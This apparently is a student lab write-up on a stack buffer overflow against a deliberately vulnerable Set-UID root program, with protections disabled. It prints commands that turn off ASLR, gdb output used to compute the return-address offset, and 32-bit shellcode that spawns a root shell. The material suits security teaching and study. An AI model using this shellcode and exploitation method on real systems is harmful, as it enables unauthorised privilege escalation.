# Trabalho realizado na Semana #5

>We firstly turned off OS protections with the following code:
>```
>$ sudo sysctl -w kernel.randomize_va_space=0
>$ sudo ln -sf /bin/zsh /bin/sh
>```

## Task 1

>We ran the following program:
>```
>char *name[2];
>name[0] = "/bin/sh";
>name[1] = NULL;
>execve(name[0], name, NULL);
>```
>Then, we did the same with the 32 and 64 bits ones.
>
>In all cases, a shell was open in the same directory where the program was executed.

## Task 2

>By studying the code in the stack.c program, we realized that `strcopy` does not verify `str` size (517 bytes), which is copied to the array (100 bytes). Therefore, a buffer overflow occurs.
>
>We changed the program owner to `root` and activated `Set-UID` and deactived StackGuard and protections against code execution called by the stack.
>```
>$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
>$ sudo chown root stack
>$ sudo chmod 4755 stack
>```

## Task 3

>To exploit the vulnerability, we created an empty `badfile` and executed the vulnerable code in debug mode, so we could fiugre out the `bof()` function's return address compared to the start of the buffer.
>
>To that end, we used `gbd` and used a breakpoint in the `bof()` function.
>```
>$ touch badfile
>$ gdb stack-L1-dbg
>gdb-peda$ b bof 
>Breakpoint 1 at 0x12ad: file stack.c, line 16.
>gdb-peda$ run 
>...
>Breakpoint 1, bof (str=0xffffcf43 "V\004" as stack.c:16)
>16 {
>gdb-peda$ next
>...
>gdb-peda$ p $ebp 
>$1 = (void *) 0xffffcb18
>gdb-peda$ p &buffer 
>$2 = (char (*)[100]) 0xffffcaac
>gdb-peda$ quit
>```
>
>In the given python program, we made the following changes:
>
>The `shellcode` variable was changed to the 32-bits that executes the shell.
>```
>shellcode= (
> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
> "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
> "\xd2\x31\xc0\xb0\x0b\xcd\x80"
>).encode('latin-1')
>```
>
>The `start` variable, so that the shellcode would go to the end of the array.
>```
>start = 517-len(shellcode)  
>```
>
>Calculated the new return address.
>```
>ret = 0xffffcb18 + start 
>```
>
>With the 2 obtained addresses, we calculated the return address based on the start of the array (offset)
>```
>offset = 0xffffcb18 - 0xffffcaac + 4 
>```
>
>Executing this program generated a `badfile` file.
>
>Finally, we executed the program that creates the buffer overflow and boots a shell with root permissions.
